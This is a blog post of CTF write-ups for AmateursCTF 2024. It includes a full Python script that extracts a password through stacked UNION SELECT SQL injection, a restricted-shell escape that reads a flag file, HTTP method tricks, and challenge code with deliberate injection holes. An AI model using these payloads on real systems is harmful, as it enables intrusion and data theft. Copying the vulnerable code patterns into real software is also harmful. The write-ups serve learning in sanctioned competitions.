---
layout: post
title: AmateursCTF 2024 - Challenge Writeups
categories: [CTF Jeopardy]
tags: [ctf jeopardy,web,jail,sqli]
permalink: /posts/amateursctf2024
img_path: /images/ctfs/amateursctf2024
image:
  path: icon.png
---

I participated in AmateursCTF 2024 with [thehackerscrew](https://thehackerscrew.team) fairly casually.

You can join the Discord community for this CTF (with more writeups!) [here](https://discord.gg/AsRWwYTZmd).

## Web

### denied
> what options do i have?

The file we are given is `index.js`:
```js
const express = require('express')
const app = express()
const port = 3000

app.get('/', (req, res) => {
  if (req.method == "GET") return res.send("Bad!");
  res.cookie('flag', process.env.FLAG ?? "flag{fake_flag}")
  res.send('Winner!')
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})
```

I start with a `POST` which doesn't help.

```
$ curl -X POST "http://denied.amt.rs"
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot POST /</pre>
</body>
</html>
```

Alright, let's see what `OPTIONS` we have:
```
$ curl -X OPTIONS "http://denied.amt.rs"
GET,HEAD
```

Let's try `HEAD`:
```
$ curl -I "http://denied.amt.rs"
HTTP/1.1 200 OK
Content-Length: 7
Content-Type: text/html; charset=utf-8
Date: Mon, 08 Apr 2024 19:19:07 GMT
Etag: W/"7-skdQAtrqJAsgWjDuibJaiRXqV44"
Server: Caddy
Set-Cookie: flag=amateursCTF%7Bs0_m%40ny_0ptions...%7D; Path=/
X-Powered-By: Express
```

The cookie is the key!

Flag: <mark>amateursCTF{s0_m@ny_0ptions...}</mark>

### agile-rut
> check out this cool font i made!

Visiting the website in Burp Suite I see a request to `/`, `/agile-rut.otf`, and `/favicon.ico`

Now the one of interest is `agile-rut.otf`, which I visit and download.

I look online for how to view whats inside a font and I find [FontForge](https://fontforge.org/en-US/) is a very good tool for fonts.

After opening the font in FontForge there are some suspicious glyphs at the bottom, particularly the half of a smiley face.

![agile-rut.png](agile-rut.png)

I right click the glyph and press `Glyph Info...`, I browser through the sidebar tabs and I see something of interest in `Ligatures`.

![ligatures.png](ligatures.png)

```
a m a t e u r s c t f braceleft({) zero(0) k underscore(_) b u t underscore(_) one(1) underscore(_) d o n t underscore(_) l i k e underscore(_) t h e underscore(_) j b m o n zero(0) underscore(_) equal(=) equal(=) equal(=) braceright(})
```

Flag: <mark>amateursctf{0k_but_1_dont_like_the_jbmon0_===}</mark>

### one-shot
> my friend keeps asking me to play OneShot. i haven't, but i made this cool challenge! 

I was actually quite proud of how I solved this challenge, I thought the solution was interesting and made me experiment with some unique SQLi.

The challenge gives us an `app.py` and a `Dockerfile`.

Inside `app.py` was the following:
```python
from flask import Flask, request, make_response
import sqlite3
import os
import re

app = Flask(__name__)
db = sqlite3.connect(":memory:", check_same_thread=False)
flag = open("flag.txt").read()

@app.route("/")
def home():
    return """
    <h1>You have one shot.</h1>
    <form action="/new_session" method="POST"><input type="submit" value="New Session"></form>
    """

@app.route("/new_session", methods=["POST"])
def new_session():
    id = os.urandom(8).hex()
    db.execute(f"CREATE TABLE table_{id} (password TEXT, searched INTEGER)")
    db.execute(f"INSERT INTO table_{id} VALUES ('{os.urandom(16).hex()}', 0)")
    res = make_response(f"""
    <h2>Fragments scattered... Maybe a search will help?</h2>
    <form action="/search" method="POST">
        <input type="hidden" name="id" value="{id}">
        <input type="text" name="query" value="">
        <input type="submit" value="Find">
    </form>
""")
    res.status = 201

    return res

@app.route("/search", methods=["POST"])
def search():
    id = request.form["id"]
    if not re.match("[1234567890abcdef]{16}", id):
        return "invalid id"
    searched = db.execute(f"SELECT searched FROM table_{id}").fetchone()[0]
    if searched:
        return "you've used your shot."
    
    db.execute(f"UPDATE table_{id} SET searched = 1")

    query = db.execute(f"SELECT password FROM table_{id} WHERE password LIKE '%{request.form['query']}%'")
    return f"""
    <h2>Your results:</h2>
    <ul>
    {"".join([f"<li>{row[0][0] + '*' * (len(row[0]) - 1)}</li>" for row in query.fetchall()])}
    </ul>
    <h3>Ready to make your guess?</h3>
    <form action="/guess" method="POST">
        <input type="hidden" name="id" value="{id}">
        <input type="text" name="password" placehoder="Password">
        <input type="submit" value="Guess">
    </form>
"""

@app.route("/guess", methods=["POST"])
def guess():
    id = request.form["id"]
    if not re.match("[1234567890abcdef]{16}", id):
        return "invalid id"
    result = db.execute(f"SELECT password FROM table_{id} WHERE password = ?", (request.form['password'],)).fetchone()
    if result != None:
        return flag
    
    db.execute(f"DROP TABLE table_{id}")
    return "You failed. <a href='/'>Go back</a>"

@app.errorhandler(500)
def ise(error):
    original = getattr(error, "original_exception", None)
    if type(original) == sqlite3.OperationalError and "no such table" in repr(original):
        return "that table is gone. <a href='/'>Go back</a>"
    return "Internal server error"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
```

So from reading this code, we have SQLi on the `query` parameter on `/search` (specifically seen in this line: `query = db.execute(f"SELECT password FROM table_{id} WHERE password LIKE '%{request.form['query']}%'")`).

But we only get one character out from the start! ...right? Well the `fetchall()` and the `for` makes me think that we could exfiltrate the string character by character.

The payload I theorised was using an escape from the `LIKE` statement then using `' AND 1=2 UNION SELECT SUBSTRING(password,1,2) FROM table_{id} WHERE password LIKE '%'` and then stacking `UNION` statements to read the string line by line.

This works... kind of. They are sorted in no particular order so we have to do another way of distinguishing order. The way I thought of was to utilise the `SUBSTRING` with a different length at the end, so we will get increasing `*` in order. But, we encounter that the key starts using the same values again which gives us the same issue of not knowing what characters go where! Hmm...

I found from some research you can add a string to a variable in a query by doing the following: `(variable || "string")` and it will add it. So, the new SQL query modifies `password` to `(password | {'A'*32})` to make sure the string is long enough.

In the end I develop the following script to automate the solution (which I am quite proud of):
```python
import requests

HOST="http://one-shot.amt.rs"
LENGTH_OF_PASSWORD=32
table_id = requests.post(f'{HOST}/new_session').content.decode('utf-8').split('value="')[1].split('"')[0]

print(f"Got table id: {table_id}")

print('Generating payload...')

payload="' AND 1=2"
vals=[]
for x in range(1,LENGTH_OF_PASSWORD+1):
    payload+=f" UNION SELECT SUBSTRING((password || '{'A'*LENGTH_OF_PASSWORD}'), {x}, {x+1}) FROM table_{table_id} WHERE password LIKE '%'"
    vals.append("")
payload+="--"

print('Doing search to extract...')

search_res = requests.post(f'{HOST}/search',data={'id':table_id,'query':payload}).content.decode('utf-8')
password=""
for x in search_res.split('<li>'):
    if '</li>' in x:
        x=x.split('</li>')[0]
        vals[x.count('*')-1]=x.split('*')[0]
for x in vals:
    if x != "":
        password+=x
print(f"Got {password}, submitting...")

flag = requests.post(f'{HOST}/guess',data={'id':table_id,'password':password}).content

print(flag.decode('utf-8'))
```

```
$ python3 solve.py
Got table id: 833407575969098d
Generating payload...
Doing search to extract...
Got 44c64cd9ce505a528d9055f9b7279490, submitting...
<p>amateursCTF{go_union_select_a_life}</p>
<br />
<h3>alternative flags (these won't work) (also do not share):</h3>
<p>
... (i was told not to share, so i dont!)
</p>
```

Flag: <mark>amateursCTF{go_union_select_a_life}</mark>

## Jail

### sansomega
>Somehow I think the pico one had too many unintendeds...
>So I left some more in :)

We are given a `shell.py` which is the following:
```python
#!/usr/local/bin/python3
import subprocess

BANNED = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\\"\'`:{}[]'


def shell():
    while True:
        cmd = input('$ ')
        if any(c in BANNED for c in cmd):
            print('Banned characters detected')
            exit(1)

        if len(cmd) >= 20:
            print('Command too long')
            exit(1)

        proc = subprocess.Popen(
            ["/bin/sh", "-c", cmd], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

        print(proc.stdout.read().decode('utf-8'), end='')

if __name__ == '__main__':
    shell()
```

Now, I'm very new to jails so I approached this by, alot of trial and error. My first thought was to utilise `*` and `./` as all of those symbols are allowed.
```
$ ./*
/bin/sh: 1: ./flag.txt: Permission denied
```

So the flag is in our directory, how to read it?

I remember from messing around with symbols previously that `.` is actually `source`, so can I read the flag with `. ./*`?

```
$ . ./*
/bin/sh: 1: ./flag.txt: amateursCTF{pic0_w45n7_g00d_n0ugh_50_i_700k_som3_cr34t1v3_l1b3rt135_ade8820e}: not found
```

Yes I can!

Flag: <mark>amateursCTF{pic0_w45n7_g00d_n0ugh_50_i_700k_som3_cr34t1v3_l1b3rt135_ade8820e}</mark>

## Thanks for reading!
Feel free to give me feedback or follow me on [Twitter](https://twitter.com/sealldev).

You can also find my other contacts on the [whoami](../about) page.
